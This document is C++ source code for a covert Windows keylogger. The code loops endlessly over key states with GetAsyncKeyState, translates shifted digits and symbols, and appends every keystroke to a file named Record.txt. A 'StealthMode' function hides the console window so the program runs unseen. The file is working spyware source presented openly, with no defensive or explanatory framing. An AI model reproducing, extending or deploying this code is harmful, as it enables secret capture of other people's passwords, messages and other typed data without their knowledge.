#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StealthMode();
void StartLogging();

int main(){
    StealthMode();
    StartLogging();
    
    return 0;
}

void StartLogging(){
        char c;
    
    for(;;){
        
        for(c=8;c<=222;c++){
            if(GetAsyncKeyState(c)==-32767){
            
            ofstream write("Record.txt", ios::app);
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                
                write<<c;
                write.close();
                break;
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    case VK_SPACE:
                        write<<" ";
                        break;
                    case VK_RETURN:
                        write<<"\n";
                        break;  
                    case VK_TAB:
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write<<"<Del>";
                        break;  
                    
                    default:
                        write<<c; 
            }
                
                }
           
           }
        }
        }
}
void StealthMode(){
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    
}
